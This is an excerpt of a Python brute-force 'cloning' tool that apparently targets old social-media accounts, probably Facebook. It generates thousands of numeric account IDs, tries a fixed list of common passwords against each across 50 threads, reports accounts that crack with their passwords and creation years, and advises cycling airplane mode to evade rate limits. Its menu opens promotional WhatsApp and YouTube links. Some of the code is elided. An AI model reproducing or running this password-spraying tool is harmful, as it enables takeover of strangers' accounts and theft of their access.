...
def WEHSHI________():
    clear()
    print(f"\033[1;90m[\033[1;97m1\033[1;90m]\033[0;91m OLD✔ 2010 ✪ 2012 ✘CLONING")
    print(f"\033[1;90m[\033[1;97m2\033[1;90m]\033[0;92m OLD✔ 2009 ✪ 2010✘ CLONING")
    print(f"\033[1;90m[\033[1;97m3\033[1;90m]\033[0;93m OL✔D 2011 ✪ 2014 ✘CLONING")
    print(f"\x1b[1;90m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯\033[0;97m") 
    option = input(f"\033[1;90m[\033[1;97m?\033[1;90m]\033[0;97m ENTER YOUR CHOICE: ")
    if option == "1":os.system('xdg-open https://chat.whatsapp.com/GHcW6KYs56c2aVQPsCvsD4?mode=wwt');__2010___2011()
    elif option == "2":os.system('xdg-open https://whatsapp.com/channel/0029Vb6d5lB6hENw6TLYrO3h');____old2009___()
    elif option == "3":os.system('xdg-open https://youtube.com/@romantic-b7x?si=pFYPNRuwkYjetVIv');_____old2011_____()
    else:
...
def __2010___2011():
    user = []
    clear()
    print(f"\033[1;90m⌠\033[1;97m=\033[1;90m⌡\033[1;97m For Example : (40000)  (500000) (600000) (700000)")
    linex()
    ...
    for i in range(int(limit)):
        ...
        user.append(data)
    with KAMRULXD(max_workers=50) as KAMRUL:
        tl = str(limit)
        clear()
        print(f"\033[1;90m⌠\033[1;97m=\033[1;90m⌡\033[1;33m TOTAL IDS : \033[92m{tl}")
        print(f"\033[1;90m⌠\033[1;97m=\033[1;90m⌡\033[0;91m ✘USE AIRPLANE MOD AFTER 5MINT FOR BEST RESULT✪")
        linex()
        for mal in user:
            uid = mal
            pas = ['123456', '1234567', '12345678', '123123', '1234567890', '143143', '112233', '111222', '123456789']
            KAMRUL.submit(____old____, uid, pas, tl)
...
def ____old2009___():
    ...
    with KAMRULXD(max_workers=50) as KAMRUL:
        ...
        print(f"\033[1;90m⌠\033[1;97m=\033[1;90m⌡\033[1;91m ✘USE AIRPLANE MOD AFTER 5MINT FOR BEST RESULT✪")
        linex()
        for love in user:
            uid = "100000" + love
            pas = ['123456', '1234567', '12345678', '123123', '1234567890', '143143', '112233', '111222', '123456789']
...
def _____old2011_____():
    ...
    with KAMRULXD(max_workers=50) as KAMRUL:
        ...
        tl = str(len(user))
        print(f"\033[1;90m⌠\033[1;97m=\033[1;90m⌡\033[0;97m TOTAL IDS : \033[92m{tl}")
        print(f"\033[1;90m⌠\033[1;97m=\033[1;90m⌡\033[0;97m ✘USE AIRPLANE MOD AFTER 5MINT FOR BEST RESULT✪")
        linex()
        for love in user:
            uid = "10000" + love
            pas = ['123456', '1234567', '12345678', '123123', '1234567890', '143143', '112233', '111222', '123456789']
...
def ____old____(uid,pas,tl):
    ...
    sys.stdout.write(f"\r\033[0m[\033[1;91mRJ KAMRUL✪\033[0m] \033[0;93m{loop}\033[0m/\033[1;91m{tl} \033[1;97m[\033[1;92mOK-{ok}\033[1;97m]");sys.stdout.flush()
    try:
        for ps in pas:
            ...
            if "Please Confirm Email" in str(po):
                print(f"\r\033[1;92m[KAMRUL -OK😇] {uid} ● {ps}\033[1;97m ● \033[1;92m{creationyear(uid)}")
